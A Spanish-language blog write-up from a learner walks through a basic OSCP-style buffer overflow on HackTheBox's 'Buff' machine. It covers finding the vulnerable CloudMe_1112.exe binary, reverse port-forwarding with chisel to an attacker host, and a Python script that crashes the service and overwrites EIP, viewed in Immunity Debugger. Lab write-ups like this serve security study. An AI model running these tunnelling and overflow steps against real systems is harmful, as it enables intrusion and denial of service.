---
layout: single
title: BufferOverFlow (Basic)
excerpt: "He decidido crearme una pagina para ir publicando todo lo que voy aprendiendo y asi si le es util a alguien mas, puede utilizar el contenido, tambien hare writeups de vez en cuando no tanto con el objetivo de eseñar como resolver dicha maquina sino para repasar como la hize, pero lo dicho que si a alguien le es util, ahi esta."
date: 2021-08-19
classes: wide
header:
  #teaser: /assets/images/htb-writeup-delivery/delivery_logo.png
  #teaser_home_page: true
  #icon: /assets/images/hackthebox.webp
categories:
  - Leaning
tags:  
  - BoF
  - Port Forwarding
---

Explicacion del BoF del OSCP tomando como modelo la maquina "Buff" de HTB

## Requirements
* Windows 7 x86 (VM)
* Immunity Debugger
* Mona

## Identificar posibles archivos
* WinPEAS.exe
* En el apartado:

<center><img src="/assets/images/buffer-overflow(basic)/winPEAS.png"></center>

* Analizamos los binarios y buscamos que permisos tiene nuestro usuario (shaun) sobre estos binarios, vemos que tiene "AllAccess" lo que nos llama la atencion y decidimos investigar sonbre ese binario
  * En este caso "CloudMe_1112.exe" es bulnerable a BoF

## Port Forwarding

* En este caso el puerto que utiliza es interno (8888) asi que utilizaremos la heramienta **chisel** para hacer Port Forwarding del puerto 8888
  * <span style="color:red">*Atacante:*</span>
    * chisel server --reverse --port 1234
  * <span style="color:#7cb9e8">*Victima:*</span>
    * chisel client \<ip del atacante\>:1234 R:8888:127.0.0.1:8888

## Reconocimiento de vulnerabilidad BoF

* Creamos un **exploit.py** en python3 para comprobar la vulnerabilidad BoF:

```py
#!/usr/bin/python3

import socket
import signal
import pdb
import sys
import time

from pwn import *
from struct import pack

# Variables globales
remoteAddress = "127.0.0.1"

def executableExploit():
  payload = b"A" * 5000

  # Establecemos un socket TCP
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((remoteAddress, 8888))
  s.send(payload)

if __name__ == "__main__":
  executableExploit()

```

Al ejecutar el script vemos que hemos provocado un DOS al CloudMe.

* Analizamos que sucede con Immunity Debugger en nuestra maquina windows 7 x86 local

  * Reiniciamos el CloudMe e iniciamos el Immunity Debbuger con el Mona instalado
  * Nos vinculamos al servicio -->1File/attach/CloudMe 
  
_NOTA: Siempre que nos vinculamos se pausa automaticamente, hay que darle a PLAY_

<center><img src="https://s4vinotes.michellopez.org/images/Buff-ID_attach.png"></center>

  * Ejecutamos de nuevo el exploit.py
  * Vemos que se ha sobreescrito tanto el EIP como otros registros

_Explicacion grafica del stack_

<center><img src="https://s4vinotes.michellopez.org/images/Buff-stack_explanation.png"></center>

## Comandos utiles:
Linux:
* `lsof -i:8888` --> listar servicio en el puerto 8888

Windows:

